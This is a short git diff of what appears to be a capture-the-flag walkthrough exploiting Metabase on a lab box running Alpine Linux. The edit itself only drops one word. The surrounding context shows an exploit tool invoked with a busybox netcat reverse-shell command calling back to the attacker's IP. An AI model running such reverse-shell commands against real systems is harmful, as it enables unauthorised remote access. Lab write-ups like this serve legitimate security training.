@@ -73,7 +73,7 @@ Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
 
 Via that method, I was able to determine the box was running [Alpine Linux](https://www.alpinelinux.org/) in a relatively minimal environment. That information is also discoverable via the [Metabase dockerfile](https://github.com/metabase/metabase/blob/master/Dockerfile), if you know where to look.
 
-Eventually I discovered that running the commands explicitly via `busybox` solved the problem:
+Eventually I discovered that running the commands via `busybox` solved the problem:
 
 ```console
 $ cargo run -- --url http://data.analytical.htb --command 'busybox nc 10.10.16.5 443 -e busybox sh'
